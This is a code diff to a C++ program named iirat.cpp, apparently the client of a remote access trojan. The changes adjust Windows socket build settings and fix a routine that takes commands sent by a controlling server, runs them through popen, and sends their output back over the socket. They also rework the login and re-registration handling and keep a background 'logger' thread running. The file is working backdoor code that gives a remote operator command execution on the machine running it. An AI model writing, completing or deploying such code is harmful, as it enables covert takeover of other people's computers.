@@ -2,7 +2,7 @@
 * @Author: amaneureka
 * @Date:   2017-04-02 03:33:49
 * @Last Modified by:   amaneureka
-* @Last Modified time: 2017-04-04 13:53:42
+* @Last Modified time: 2017-04-04 18:23:00
 */
 
 #include <vector>
@@ -16,20 +16,20 @@ using namespace std;
 
 #if __WIN__
 
-    /* g++ -std=c++11 iirat.cpp -D__WIN__ -lws2_32 */
+    /* g++ -std=gnu++0x -U__STRICT_ANSI__ iirat.cpp -D__WIN__ */
 
     /* supporting win 7 or later only */
     #define WINVER _WIN32_WINNT_WIN7
     #define _WIN32_WINNT _WIN32_WINNT_WIN7
 
     #include <windows.h>
-    #include <winsock2.h>
-    #include <w32api/ws2tcpip.h>
+    #include <arpa/inet.h>
+    #include <sys/socket.h>
 
     /* simple POSIX to windows translation */
     #define sleep Sleep
-    #define read(soc, buf, len) recv(soc, buf, len, MSG_OOB)
-    #define write(soc, buf, len) send(soc, buf, len, MSG_OOB)
+    #define read(soc, buf, len) recv(soc, buf, len, 0)
+    #define write(soc, buf, len) send(soc, buf, len, 0)
 
 #elif __LINUX__
 
@@ -175,6 +175,7 @@ int execute_cmd(int socket, const string cmd)
     FILE *pPipe;
     char buffer[128] = "RSP-1";
 
+    fflush(stdin);
     pPipe = popen(cmd.c_str(), "r");
     if (pPipe == NULL)
     {
@@ -182,10 +183,15 @@ int execute_cmd(int socket, const string cmd)
         return -1;
     }
 
-    while(fgets(buffer + 3, 125, pPipe) > 0)
-        write(socket, buffer, sizeof(buffer));
+    string str;
+    while(fgets(buffer + 3, 125, pPipe))
+    {
+        str = buffer;
+        write(socket, str.c_str(), str.size());
+    }
 
-    fclose(pPipe);
+    pclose(pPipe);
+
     return 0;
 }
 
@@ -200,19 +206,6 @@ int main(int argc, char *argv[])
     fd_set active_fd_set, read_fd_set;
 
     pthread_t logger_thread;
-
-    #if __WIN__
-
-        WSADATA wsa;
-
-        /* windows socket needs initialization */
-        if (WSAStartup(MAKEWORD(2,2), &wsa) != 0)
-        {
-            printf("initialization failed\n");
-            exit(0);
-        }
-
-    #endif
 
     /* create socket */
     sock = socket(AF_INET , SOCK_STREAM , 0);
@@ -249,9 +242,6 @@ int main(int argc, char *argv[])
     /* start background tasks */
     pthread_create(&logger_thread, NULL, &logger, &sock);
 
-    /* basic login */
-    register_device(sock, NULL);
-
     while(true)
     {
         read_fd_set = active_fd_set;
@@ -279,7 +269,7 @@ int main(int argc, char *argv[])
 
                     if (req == "UID")
                     {
-                        printf("[UID] key=\'%s\'\n", req.c_str());
+                        printf("[UID] key=\'%s\'\n", cmd.substr(3).c_str());
 
                         /* change current state */
                         logged_in = false;
@@ -298,11 +288,13 @@ int main(int argc, char *argv[])
                     {
                         printf("[INV] Invalid\n");
 
+                        remove(".socket");
+
                         /* invalid command */
                         logged_in = false;
 
                         /* try to login again */
-                        register_device(sock, NULL);
+                        register_device(sock, "");
                     }
                     else if (req == "IDY")
                     {
@@ -312,18 +304,17 @@ int main(int argc, char *argv[])
                         logged_in = false;
 
                         /* try to login again */
-                        register_device(sock, NULL);
+                        register_device(sock, "");
                     }
                     else if (req == "CMD")
                     {
                         printf("[CMD] \'%s\'\n", req.c_str());
 
                         /* command to execute */
-                        int status = execute_cmd(sock, req);
+                        int status = execute_cmd(sock, cmd.substr(3));
 
                         if (status) printf("\tFailed!\n");
                     }
-                    break;
                 }
             }
         }
